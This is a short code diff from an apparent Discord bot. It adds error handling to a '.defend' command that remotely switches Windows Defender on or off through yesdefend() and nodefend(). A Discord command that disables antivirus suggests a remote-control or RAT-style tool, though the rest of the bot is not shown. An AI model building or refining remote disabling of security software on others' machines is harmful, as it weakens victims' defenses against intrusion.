@@ -296,11 +296,19 @@ async def defend(ctx, action: str = None):
         embed.description = "This command toggles Windows Defender."
         embed.add_field(name="Usage", value=".defend on/off", inline=False)
     elif action.lower() == 'on':
-        yesdefend()
-        embed.description = "Windows Defender has been successfully enabled."
+        try:
+            yesdefend()
+            embed.description = "Windows Defender has been successfully enabled."
+        except Exception as e:
+            embed.description = f"Failed to enable Windows Defender: {str(e)}"
+            embed.color = discord.Color.red()
     elif action.lower() == 'off':
-        nodefend()
-        embed.description = "Windows Defender has been successfully disabled."
+        try:
+            nodefend()
+            embed.description = "Windows Defender has been successfully disabled."
+        except Exception as e:
+            embed.description = f"Failed to disable Windows Defender: {str(e)}"
+            embed.color = discord.Color.red()
     else:
         embed.description = "Please provide a valid argument: `on` or `off`."
         embed.add_field(name="Usage", value=".defend on/off", inline=False)
